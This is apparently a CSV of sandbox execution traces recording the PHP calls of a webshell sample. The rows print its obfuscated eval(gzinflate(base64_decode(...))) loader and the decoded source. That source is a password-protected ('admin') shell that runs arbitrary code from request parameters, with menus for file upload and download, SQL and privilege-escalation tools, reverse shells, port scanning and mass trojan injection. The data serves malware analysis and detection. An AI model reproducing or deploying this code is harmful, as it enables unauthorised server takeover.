"uuid","file_md5","index","source","target","argc","argv","return","dynamic"
"efcfde24f7cf8383986cf4797aceaba3","6db2e4351d4790d1f437ef47852e60b9","0","__main__","zend_compile_file","2","{""value"": []}","{""value"": ""26262609413C39413C3A413C0808080808080808080808080808080808082641423C263B3D3E""}","[]"
"efcfde24f7cf8383986cf4797aceaba3","6db2e4351d4790d1f437ef47852e60b9","1","__main__","error_reporting","1","{""value"": [[0, ""new_error_level"", 5]]}","{""value"": ""void""}","[0]"
"efcfde24f7cf8383986cf4797aceaba3","6db2e4351d4790d1f437ef47852e60b9","2","__main__","set_time_limit","1","{""value"": [[0, ""seconds"", 0]]}","{""value"": ""void""}","[0]"
"efcfde24f7cf8383986cf4797aceaba3","6db2e4351d4790d1f437ef47852e60b9","3","__main__","header","1","{""value"": [[0, ""header"", ""content-Type: text/html; charset=gb2312""]]}","{""value"": ""void""}","[0]"
"efcfde24f7cf8383986cf4797aceaba3","6db2e4351d4790d1f437ef47852e60b9","4","__main__","create_function","2","{""value"": [[0, ""args"", """"], [1, ""code"", ""$password='admin';
$shellname='';$myurl='http://www.baidu.com';
eval(gzinflate(base64_decode('7L35dxzXfSf6M3OO/4dy
G1YDJpbaF0Kg""]]}","{""value"": ""\x00lambda_1""}","[0, 0]"
"efcfde24f7cf8383986cf4797aceaba3","6db2e4351d4790d1f437ef47852e60b9","5","create_function","zend_compile_string","2","{""value"": [[0, ""source_string"", ""function __lambda_func(){$password='admin';
$shellname='';$myurl='http://www.baidu.com';
eval(gzinflate(base64_decode('7L35dxzXfSf6M3OO/4dy
G1YDJpbaF0KgVSsJLgAJgKRIUQ+v0WgALTTQLXSDiyj+MU5mJn
6ezIkla7EtyYol2ZLlRYoly45PMpN4MpnJ6HneZJnsmfM+n3ur
qqt6AUHZTl7OCyQC3VV3v9/9fr/f295Y7/ZqB73JqflP/dpmY6
u535is7t2tbW4eNLrd6vTE+mq8cjVeeaK6Gq4sXlpbTxYvxEv+
xbj6ZLFGY/9Wq1MTFfjndvtgs/i6u9NotfZrew28zz+Xezw8aO
Gl+MsXza3Jx7YbvfW92nazvv70YbvX6K5vd+qTU1P3PvVrJ7ba
B41afWdyYv3S8uqaUusqE7vKwmll4taUIp89MbH7pLKgdHsHzU
63VUOv3Um8nS9VPhMP1cWj8VXvi4E1u91GD7VX4stXYvSUTf5J
MbadvVZ7u7k/qbPCY41btdbIonjZuNPszcsmJ9bD5eXzi/ET/Z
V8Uvn0grK3aU1mT+TMRWExwUJR8Wb0K2VhQclbEMVOYPT1dnu3
Wdo39jSiYbFgJ05kk5Jf7zda3YZsq1HfaSvVR8N4aS1eOf3Bm6
/85it//ubvv/HxCz//wV88Opc+rspa+MV/za5sqw8JhX0/IRZF
rPTc52ZmZuL9TeUCi+Pz5+ZKy8+dqm62b+9zmMpme52fB57PD9
fo1Oq7VblVJyY2mwfYadTt7rRvD5TgaCaeaXZQYL9xW2nU9m81
DiZZRb5qH/bwiiVmTuMzn6WDaLVrm5N8P12RtWaBYrPbz1SGYU
h0eLiPRrIx1btdQH221gI510WBgdLTo7/22hhgOvr+WvYx7aDd
7q2zyDTge/2g0WnV6nh882Z1ujpXncYb7shkTgKmpmbxvIirB4
f767eb+2jgcANtTF46e2l9eXVaUacVY4rgVrm2uFQpY/e62GvZ
Z6fW25nMhjE7RGBS4sL6E3L1sMql5ZJPUUb5vDLwSDmlVCqsud
lu7m8XKkrAFk+ziqVHeUWObrBDPit1Jx+gTjYN1uS6DfUoiF6p
Q/kk76+5tz3YHR6VehPf+wMcGl15aMWiLAvEauzX25uNyWxvJz
pTKWKw9ymFEIcP8lv6Ilt57GZnp9Pc32pXgGMgGem3yanhklXg
NYC+KsB4JJHZP2xJLGdL1Uf3Gr2astPrdWYaTx82by1UDhpbgL
mdilJv7/ca+72Fijp/ZeXCwucrp6tTGSRP1EGTu5hZ7eCgdnfy
U79Wef9b7/3687/347+ukIzLp5XDzlaz1eiKR5XvvPfCv//BW6
/+78p0Phvx/JW/fe4brIznfLi+JR+/9+L3v5I+Jv2WDz964f33
Aeqvfeu5b1SmptHr9/7onS9+7d984z8Ve+0+3RKQ3q+yevkC/6
Cpvbt4u96406jLtxev450YNt817nQKj9k2HncbB7cO5eNVfJy5
kj7fT5tYCl9+4cXfxoNWc//wjnx2gR/TxxkxahzId1yD99748C
dch/ZBTz586buv//Q7X3zzv8lZfevvvvn64FpuH9b2arIwX3/t
h2/8/O3/8sbP0UqvuXNY2++/+t6fvPLKWz995w849nptn1vQf/
nd3/3uX6e7wJfYif675//0Rz986xtoUwyCi/z8f0HJ4iAIUJtp
c6/82Ttf+P7f/PArH77wxseVqU/9mqAWe93tHCoqqiz43G+88C
df+c7X/h361PpP3v3NL/8+nuh96EjLGP0naRlTPnn/P371rbSM
1X+SlrHTWt/4yj+mZZz+E1GG4ysR9u7tZo8iiMQeSfhr3YZSaT
W2epVTKR/gl5Tn7vT2Wuv7k5VHN1unH93snX4UmAN0WbhZ+czN
itLer7ea9V18IyM72wS2V5u9xl5XA97gPbgI1g+v17uN1tbNyu
lKoVXiPnayh72ams/6UZ77xos/+eD5b33v0bna6Ufn2OPmptLc
RBuyYbTa7d1tNfBgs9kFG7l7aqPVru+iu9OPHrZkDwp+JlaWl9
fWo8UVbE4CgFi/SGKUvc3n1WpyTmIYC9W8TlXOsvp5uVALXMBH
SH4XCkXS2VX5snr6+3/zo2989W/fev2NV+XQ0bCc7UBXww0Ptv
TcN77yvff/fERLkCAVkMsF256faD664Kn4c/Lk1L2JzYPmrcaC
Ut+BoNAE5zxVTafZ3FLA88kqJmWh2cpcBQx/4la7tSBWZRWstI
JvinyPjkBdG3ud3t1JFpqaEkXly6PXThQ5YuHS94NzffEnL3zr
W99LhzdVnPH9+8XVm8PmAiA2+Svd5hMTTWyuXhKuJZWmdC0ZIw
RsgZpSCP2E4DzR/MTwLIYxBpgnmseC5hP92YmpiNmBv0rtodY6
bKQS9ihIu1nJtoJV+nNI11/WH4AzIS8fvfInCHnzqWj9q1nVIx
b123/83X8gt/gF13U0IL/5s+8899V/eP+NDJQpKZyam7t9+/bs
M089dWu23t6r9sfMZUSjWaXySo7Hli8//86///53v/JXg/iSyj
JD7Wflx9GWUXvUf7nZvJU+2wAg7fJDTvnZQU75n+pOgmFJ3JJK
ymOCdhCD5dOV2L9QpKqkH2izJcRrWU4UBBX5dEpGUgm0Vu/VII
xT30jVNwxLEfi6UJEvIW/Nilb9el+WFQKV0DTK7eQPmlIIn87H
Bgoo51ylnntiYunKxfWIShM/JPigZiMsqAHib6YGKBOQaiECom
y1Oq9Q8Sw+SkGiOjumPnUXuVrjeFB/c3q1jVZDud3cBI28WdFU
9bMA3o32AaSnBVXZ2K63W+0DopIlfgjAvQP8w1aDLOwpkGZ32p
sLVYyuevrFn3z08qlHm/sdKIm9ux0A2k5zc7MBFkMytJApLIrA
+owGDEBLsXavcQfA2G0+g8+umrUi9JCsDbHn1dNKqR50tL1mLy
/z4y+9+FoVoMkBD3a3cTAwEW5qVYHyIJoCBhy2es0O9FFRfWaz
1qthhQAFzfZ+H3Eam83ewSOdhcpsX/OQ4DhbOWqKNysbh71eGz
iWDvZm5f03XvsiBcYS7To47B4eAG53J6tQywmTs5Akob0eZwCP
AMdRY0F7RC4gyV55xcYMg0LAEcMQCvVxR4DC5QEUySxHMlkRgv
N0qsT08An/P7K/0e3Mj/utDDci9140QyWAnyjYVsaQhXQ1MzvE
iYKVQhbYaEpTywQ+EImLjzPUlK8qtzcqKdXNhJ+CsQDoubq4vD
StTmtTpxesqXvoKe+kvlM7QKfVJxeASYFuaHp1ShHi1sgC56sY
rbRHZQV6wBTa75pQIm9Bb9hgI3Nzi2eWllfiyvRQO9Oliqm0Iw
1bm+312wfgZMNrNM2ZDtSEEl4lFpEaDRSfrSp4CgXlCZXq+YOL
aU8K5v5Yr32YmzmL3T+Gxey1e829/tj4JbPYFYSBaortj86RUs
2RZM0JUlfG9gobqUi6IsCPXICsvP8lxfTKsEiJQfPvbJU0sUBG
BRUdQUQzGipIqLLTaG7vQNfXxffNrK5pfRbfN6TmL2dTmxwhz1
ZnDzsFpjeNxT39nfdefUnK7aX6YjU20qVAT7VWcxsTqjf2e1SR
80HLjqVg88DiHOZAHxunSbbe/cv3P3yI7oRC+dyrf/wQVdjLC3
/x/hf6Vbi/cjC3d7BvwlxJW8lj/DBzGgLC5mQfv9O3YKSAPCBZ
4fss0I5WmOb+YUPKmXiXGsdyK15FLPmcqJaKo4JqpHqOrJB2d2
Ki0wC4obakBBsQetaJoo2D3iRhjK+7/VrTmjrtTk3PmKkJekKQ
wqawsT0G3gPh9foMuJBy9lTzVLc6/Rjf70mMyHtOq/aHXiDIWa
H5osheHQGQp4v8oVLfadR3N9p3irjSfeLJjF1UgAtcDuJCtdi2
E""]]}","{""value"": ""003E""}","[0]"
"efcfde24f7cf8383986cf4797aceaba3","6db2e4351d4790d1f437ef47852e60b9","6","__main__","__lambda_func","0","{""value"": []}","{""value"": null}","[]"
"efcfde24f7cf8383986cf4797aceaba3","6db2e4351d4790d1f437ef47852e60b9","7","__lambda_func","base64_decode","1","{""value"": [[0, ""str"", ""7L35dxzXfSf6M3OO/4dy
G1YDJpbaF0KgVSsJLgAJgKRIUQ+v0WgALTTQLXSDiyj+MU5mJn
6ezIkla7EtyYol2ZLlRYoly45PMpN4MpnJ6HneZJnsmfM+n3ur
qqt6""]]}","{""value"": ""\xec\xbd\xf9w\x1c\xd7}'\xfa3s\x8e\xff\x87r\x1bV\x03&\x96\xda\x17B\xa0U+	.\x00	\x80\xa4HQ\x0f\xaf\xd1h\x00-4\xd0-t\x83\x8b(\xfe1Nf&~\x9e\xcc\x89%k\xb1-\xc9\x8a%\xd9\x92\xe5E\x8a%\xcb\x8eO2\x93x2\x99\xc9\xe8y\xded\x99\xec\x99\xf3>\x9f{\xab\xaa\xabz\x01A\xd9N^\xceu000b$\x02\xddUw\xbf\xdf\xfd~\xbf\xdf\xdb\xdeX\xef\xf6j\x07\xbd\xc9\xa9\xf9O\xfd\xdafc\xab\xb9\xdf""}","[0]"
"efcfde24f7cf8383986cf4797aceaba3","6db2e4351d4790d1f437ef47852e60b9","8","__lambda_func","gzinflate","1","{""value"": [[0, ""data"", ""\xec\xbd\xf9w\x1c\xd7}'\xfa3s\x8e\xff\x87r\x1bV\x03&\x96\xda\x17B\xa0U+	.\x00	\x80\xa4HQ\x0f\xaf\xd1h\x00-4\xd0-t\x83\x8b(\xfe1Nf&~\x9e\xcc\x89%k\xb1-\xc9\x8a%\xd9\x92\xe5E\x8a%\xcb\x8eO2\x93x2\x99\xc9\xe8y\xded\x99\xec\x99\xf3>\x9f{\xab\xaa\xabz\x01A\xd9N^\xceu000b$\x02\xddUw\xbf\xdf\xfd~\xbf\xdf\xdb\xdeX\xef\xf6j\x07\xbd\xc9\xa9\xf9O\xfd\xdafc\xab\xb9\xdf""]]}","{""value"": ""ob_start();
define('myaddress',$_SERVER['SCRIPT_FILENAME']);
define('envlpass',$password);
define('shellname',$shellname);
def""}","[0]"
"efcfde24f7cf8383986cf4797aceaba3","6db2e4351d4790d1f437ef47852e60b9","9","__lambda_func","eval","1","{""value"": [[0, ""phpcode"", ""ob_start();
define('myaddress',$_SERVER['SCRIPT_FILENAME']);
define('envlpass',$password);
define('shellname',$shellname);
def""]]}","{""value"": null}","[0]"
"efcfde24f7cf8383986cf4797aceaba3","6db2e4351d4790d1f437ef47852e60b9","10","eval","zend_compile_string","2","{""value"": [[0, ""source_string"", ""ob_start();
define('myaddress',$_SERVER['SCRIPT_FILENAME']);
define('envlpass',$password);
define('shellname',$shellname);
define('myurl',$myurl);
if(@get_magic_quotes_gpc()){
	foreach($_POST as $k => $v) $_POST[$k] = stripslashes($v);
	foreach($_GET as $k => $v) $_GET[$k] = stripslashes($v);
}
if(isset($_REQUEST[envlpass])){
hmlogin(2);
@eval($_REQUEST[envlpass]);
exit;}
if($_COOKIE['envlpass'] != md5(envlpass)){
	if($_POST['envlpass']){
		if($_POST['envlpass'] == envlpass){
			setcookie('envlpass',md5($_POST['envlpass']));
			hmlogin();
		}else{
			echo '<CENTER>\xd3\xc3\xbb\xa7\xbb\xf2\xc3\xdc\xc2\xeb\xb4\xed\xce\xf3</CENTER>';
		}
	}
	islogin($shellname,$myurl);
	exit;
}
/*---End Login---*/
if(isset($_GET['down'])) do_down($_GET['down']);
if(isset($_GET['pack'])){
	$dir = do_show($_GET['pack']);
	$zip = new eanver($dir);
	$out = $zip->out;
	do_download($out,""eanver.tar.gz"");
}
if(isset($_GET['unzip'])){
	css_main();
	start_unzip($_GET['unzip'],$_GET['unzip'],$_GET['todir']);
	exit;
}

define('root_dir',str_replace('\\','/',dirname(myaddress)).'/');
define('run_win',substr(PHP_OS, 0, 3) == ""WIN"");
define('my_shell',str_path(root_dir.$_SERVER['SCRIPT_NAME']));
$eanver = isset($_GET['eanver']) ? $_GET['eanver'] : """";
$doing = isset($_POST['doing']) ? $_POST['doing'] : """";
$path = isset($_GET['path']) ? $_GET['path'] : root_dir;
$name = isset($_POST['name']) ? $_POST['name'] : """";
$img = isset($_GET['img']) ? $_GET['img'] : """";
$p = isset($_GET['p']) ? $_GET['p'] : """";
$pp = urlencode(dirname($p));
if($img) css_img($img);
if($eanver == ""phpinfo"") die(phpinfo());
if($eanver == 'logout'){
	setcookie('envlpass',null);
	die('<meta http-equiv=""refresh"" content=""0;URL=?"">');
}

$class = array(
""\xd0\xc5\xcf\xa2\xb2\xd9\xd7\xf7"" => array(""upfiles"" => ""\xc9\xcf\xb4\xab\xce\xc4\xbc\xfe"",""phpinfo"" => ""\xbb\xf9\xb1\xbe\xd0\xc5\xcf\xa2"",""info_f"" => ""\xcf\xb5\xcd\xb3\xd0\xc5\xcf\xa2"",""eval"" => ""\xd6\xb4\xd0\xd0PHP\xbd\xc5\xb1\xbe""),
""\xcc\xe1\xc8\xa8\xb9\xa4\xbe\xdf"" => array(""sqlshell"" => ""\xd6\xb4\xd0\xd0SQL\xd6\xb4\xd0\xd0"",""mysql_exec"" => ""MYSQL\xb2\xd9\xd7\xf7"",""myexp"" => ""MYSQL\xcc\xe1\xc8\xa8"",""servu"" => ""Serv-U\xcc\xe1\xc8\xa8"",""nc"" => ""NC\xb7\xb4\xb5\xaf"",""linux"" => ""Linux\xb7\xb4\xb5\xaf"",""downloader"" => ""\xce\xc4\xbc\xfe\xcf\xc2\xd4\xd8"",""port"" => ""\xb6\xcb\xbf\xda\xc9\xa8\xc3\xe8""),
""\xc5\xfa\xc1\xbf\xb2\xd9\xd7\xf7"" => array(""guama"" => ""\xc5\xfa\xc1\xbf\xb9\xd2\xc2\xed\xc7\xe5\xc2\xed"",""tihuan"" => ""\xc5\xfa\xc1\xbf\xcc\xe6\xbb\xbb\xc4\xda\xc8\xdd"",""scanfile"" => ""\xc5\xfa\xc1\xbf\xcb\xd1\xcb\xf7\xce\xc4\xbc\xfe"",""scanphp"" => ""\xc5\xfa\xc1\xbf\xb2\xe9\xd5\xd2\xc4\xbe\xc2\xed""),
""\xbd\xc5\xb1\xbe\xb2\xe5\xbc\xfe"" => array(""getcode"" => ""\xbb\xf1\xc8\xa1\xcd\xf8\xd2\xb3\xd4\xb4\xc2\xeb"")
);
$msg = array(""0"" => ""\xb1\xa3\xb4\xe6\xb3\xc9\xb9\xa6"",""1"" => ""\xb1\xa3\xb4\xe6\xca\xa7\xb0\xdc"",""2"" => ""\xc9\xcf\xb4\xab\xb3\xc9\xb9\xa6"",""3"" => ""\xc9\xcf\xb4\xab\xca\xa7\xb0\xdc"",""4"" => ""\xd0\xde\xb8\xc4\xb3\xc9\xb9\xa6"",""5"" => ""\xd0\xde\xb8\xc4\xca\xa7\xb0\xdc"",""6"" => ""\xc9\xbe\xb3\xfd\xb3\xc9\xb9\xa6"",""7"" => ""\xc9\xbe\xb3\xfd\xca\xa7\xb0\xdc"");
css_main();
switch($eanver){
	case ""left"":
	css_left();
		html_n(""<dl><dt><a href=\""#\"" onclick=\""showHide('items1');\"" target=\""_self\"">"");
		html_img(""title"");html_n("" \xb1\xbe\xb5\xd8\xd3\xb2\xc5\xcc</a></dt><dd id=\""items1\"" style=\""display:block;\""><ul>"");
    $ROOT_DIR = File_Mode();
    html_n(""<li><a title='$ROOT_DIR' href='?eanver=main&path=$ROOT_DIR' target='main'>\xcd\xf8\xd5\xbe\xb8\xf9\xc4\xbf\xc2\xbc</a></li>"");
	html_n(""<li><a href='?eanver=main' target='main'>\xb1\xbe\xb3\xcc\xd0\xf2\xc4\xbf\xc2\xbc</a></li>"");
	for ($i=66;$i<=90;$i++){$drive= chr($i).':';
    if (is_dir($drive.""/"")){$vol=File_Str(""vol $drive"");if(empty($vol))$vol=$drive;
    html_n(""<li><a title='$drive' href='?eanver=main&path=$drive' target='main'>\xb1\xbe\xb5\xd8\xb4\xc5\xc5\xcc($drive)</a></li>"");}}
	html_n(""</ul></dd></dl>"");
	$i = 2;
	foreach($class as $name => $array){
		html_n(""<dl><dt><a href=\""#\"" onclick=\""showHide('items$i');\"" target=\""_self\"">"");
		html_img(""title"");html_n("" $name</a></dt><dd id=\""items$i\"" style=\""display:block;\""><ul>"");
		foreach($array as $url => $value){
			html_n(""<li><a href=\""?eanver=$url\"" target='main'>$value</a></li>"");
		}
		html_n(""</ul></dd></dl>"");
		$i++;
	}
	html_n(""<dl><dt><a href=\""#\"" onclick=\""showHide('items$i');\"" target=\""_self\"">"");
	html_img(""title"");html_n("" \xc6\xe4\xcb\xfc\xb2\xd9\xd7\xf7</a></dt><dd id=\""items$i\"" style=\""display:block;\""><ul>"");
	html_n(""<li><a title='\xc3\xe2\xc9\xb1\xb8\xfc\xd0\xc2' href='http://www.zjjv.com' target=\""main\"">\xc3\xe2\xc9\xb1\xb8\xfc\xd0\xc2</a></li>"");
    html_n(""<li><a title='\xb0\xb2\xc8\xab\xcd\xcb\xb3\xf6' href='?eanver=logout' target=\""main\"">\xb0\xb2\xc8\xab\xcd\xcb\xb3\xf6</a></li>"");
	html_n(""</ul></dd></dl>"");
	html_n(""</div>"");
	break;
	
	case ""main"":
	css_js(""1"");
	$dir = @dir($path);
	$REAL_DIR = File_Str(realpath($path));
	if(!empty($_POST['actall'])){e""]]}","{""value"": ""3C415051423C41423C41423C41423C393C3A2B504D4E892626423C5393892A31504D4E892626423C5393892A312A6359732B3B413D39635051493A4F2A505163413C122B50512B505163112B415051423C6A3C3B3D2A282A3B42423D4F2A59732B3B5C5D423D2A59732B3B5C5D423D266D44423D2652263B42413D2A59732B3B3D3B5C5D425C5D425C5D423D4F2A41414163413C6A3C08413C414141413C11413C413B63505108413D6A3C59732B50519D2A9D2659732B50519D2A9D2659732B50519D2A639D2659732B50519D2A9D2659732B50519D2A9D2659732B50519D2A9D26423C6A3C262B3B423D2A112B3C4F2A112B41413C4F2A474848484747484848484848484847484848484748264748484848484848263B3D302B3B3D3B413D3B413D3B413D3B3D263B3738373837413D3B413D26142D24462A423C082608413C2B3B3738413D26722B262A3B37383738373837413D2A2A3B413D264D4E8926263B373837413D3B413D3B3638373837413D4D4E8926263B3738373837413D2A313B413D24462A313B373837413D3B413D3B373837413D3B413D3B413D3B413D3B413D322A302B3B413D3950423C3A263B423C6A3D2659730D2B3B5C5D425C5D425C5D42423D0808282A262650510D2B262A50510808263B3D263B413D3B373837413D3B423C0808413D3B423C0808423C0808413D3B414141413D3B4141413D59730D2B59732B5051262A264141413C142B5051112F505111342B2A415051425051423C5393892A3B5C5D42425C5D423D2B505108085108162A505108085108162839505142395051423C3A6A3C3A2A3B0808413D3B3B423D0841413D3B413D3B413D3950703D3A262B112F11342B332A3B383638413D26423C2B423C6A41413C6A413C2639413950423C3A6A3C3A26423C263B0808413D3B413D3B0841423D3B413D3B3738373837413D3B3738373837413D3B0841413D3B413D3B08080841423D3B0808413D3B413D24462A2A3950703D3A3950703D3A262B112F11342B332A3B383638413D26423C0D2B3950423C3A263B423D26423C6A41413C6A413C2639413950423C3A6A3C3A263B08413D6A42423C260826423C2642413C263B0808413D3B3B423D6A3D3B42423D3B413D112F11342F11342F11342B3B084141080808080808413D2A3B0841410808413D3B3738373837413D3B3738373837413D3B423C0837383708413D3B413D3B08080841423D3B0808413D3B0841420808413D3B413D24462A2A3950703D3A0D2B413C0301413C262A373837383750513837383738372946322A302B3B413D59730D2B39505151423B0850515108413D6A3C3A2B3B41505151085108413D9D2A3B5D423D9D28423C08084F2A59730D2B5051263B0808413D26395042413C3A2B3B41085108413D9D2A3B5D423D9D46423C08084F2A59730D2B5051260808413C26423C263B0808413D262626413C0301413C263950423C3A2B282A2A423C2641423C6A3C263950423C3A264141413C142B59732B3B423D132B264141423C262A262A5051112B262A50512650514241423C262A423C263738373837383738373837383729463B47484848484848484142373837413D373837383738372946322A302B3B413D423C085051423C0826395042423C3A2B3B3738415051423C085108413D9D2A3B5D423D9D4608084F322A302B3B413D3B423D2B3B373841085108413D9D2A3B5D423D9D4608084F322A302B3B413D3950423C3A2B3B373841085108413D9D2A3B5D423D9D4608084F322A302B3B413D415051423C2651938926423C132D24462A51423C93892A41423C26395042423C3A2B3B373841085108413D9D2A3B5D423D9D4608084F322A302B3B0808413D423C2B3B474848415C5D423D2A3B474848415C5D423D3B4141413D3B3D50512B5051302B395042413C3A26322A302B395042413C3A26322A302B395042413C3A26322A302B395042413C3A26322A302B395042413C3A26322A302B395042413C3A26322A312B3B3738415D423D9D2A3B5D423D9D4608084F2A3B413D322A302B413C26413C2B413C9D2A9D2659732B5051080850510808162A413C0808413C08081626112B262A4141423C264141423C2641423C0D2B162A162647413C6A3C48474750510808505108084848475051423C48484748484750514848475051484847505148484750514848473C6A3C4848474848473B413D484847484847634848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848474848473B413D08484847484847484847413C0304413C084848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848266D44413D262F4F34462826423C132D24462A515108085151080808282A70413D2670413D2670413D262A6B08080828080808280808082828322A302B59732B50519D2A50519D2659732B50519D2A9D263738373837294659730D2E59730D342B28505126505126424243433C260D2B262A42413C423C0D2B42413C42413C2638413C26420808413C2A423C282A322A302B59732B50519D2A413C9D2659732B50519D2A9D26373837294659730D2E59730D342B285051112B080808080808263B41423C6A413D2B162A16283B413D262B423C9D2A9D263B085051080850510808413D2B505108162A16282A5051112B08080808080808263B41423C6A413D2B162A16283B413D2639413C3A3B505108085051080841""}","[0]"
"efcfde24f7cf8383986cf4797aceaba3","6db2e4351d4790d1f437ef47852e60b9","11","eval","ob_start","0","{""value"": []}","{""value"": ""void""}","[]"
"efcfde24f7cf8383986cf4797aceaba3","6db2e4351d4790d1f437ef47852e60b9","12","eval","zend_fetch_r_server","1","{""value"": [[0, ""op1"", ""_SERVER""]]}","{""value"": []}","[0]"
"efcfde24f7cf8383986cf4797aceaba3","6db2e4351d4790d1f437ef47852e60b9","13","eval","define","2","{""value"": [[0, ""constant_name"", ""myaddress""], [1, ""value"", ""/usr/share/nginx/html/6db2e4351d4790d1f437ef47852e60b9_44624177-e0b5-4cb5-8244-b1169530d0c0.php""]]}","{""value"": ""void""}","[0, 0]"
"efcfde24f7cf8383986cf4797aceaba3","6db2e4351d4790d1f437ef47852e60b9","13","eval","define","2","{""value"": [[0, ""constant_name"", ""myaddress""], [1, ""value"", ""/usr/share/nginx/html/6db2e4351d4790d1f437ef47852e60b9_6d9f15a4-f949-11ea-acbd-00163e142113.php""]]}","{""value"": ""void""}","[0, 0]"
"efcfde24f7cf8383986cf4797aceaba3","6db2e4351d4790d1f437ef47852e60b9","14","eval","define","2","{""value"": [[0, ""constant_name"", ""envlpass""], [1, ""value"", ""admin""]]}","{""value"": ""void""}","[0, 0]"
"efcfde24f7cf8383986cf4797aceaba3","6db2e4351d4790d1f437ef47852e60b9","15","eval","define","2","{""value"": [[0, ""constant_name"", ""shellname""], [1, ""value"", """"]]}","{""value"": ""void""}","[0, 0]"
"efcfde24f7cf8383986cf4797aceaba3","6db2e4351d4790d1f437ef47852e60b9","16","eval","define","2","{""value"": [[0, ""constant_name"", ""myurl""], [1, ""value"", ""http://www.baidu.com""]]}","{""value"": ""void""}","[0, 0]"
"efcfde24f7cf8383986cf4797aceaba3","6db2e4351d4790d1f437ef47852e60b9","17","eval","get_magic_quotes_gpc","0","{""value"": []}","{""value"": false}","[]"
"efcfde24f7cf8383986cf4797aceaba3","6db2e4351d4790d1f437ef47852e60b9","18","eval","zend_fetch_r_cookie","1","{""value"": [[0, ""op1"", ""_COOKIE""]]}","{""value"": []}","[0]"
"efcfde24f7cf8383986cf4797aceaba3","6db2e4351d4790d1f437ef47852e60b9","19","eval","md5","1","{""value"": [[0, ""str"", ""admin""]]}","{""value"": ""21232f297a57a5a743894a0e4a801fc3""}","[0]"
"efcfde24f7cf8383986cf4797aceaba3","6db2e4351d4790d1f437ef47852e60b9","20","eval","zend_fetch_r_post","1","{""value"": [[0, ""op1"", ""_POST""]]}","{""value"": []}","[0]"
"efcfde24f7cf8383986cf4797aceaba3","6db2e4351d4790d1f437ef47852e60b9","21","eval","zend_fetch_r_post","1","{""value"": [[0, ""op1"", ""_POST""]]}","{""value"": []}","[0]"
"efcfde24f7cf8383986cf4797aceaba3","6db2e4351d4790d1f437ef47852e60b9","22","eval","islogin","2","{""value"": [[0, ""shellname"", """"], [1, ""myurl"", ""http://www.baidu.com""]]}","{""value"": ""void""}","[0, 0]"
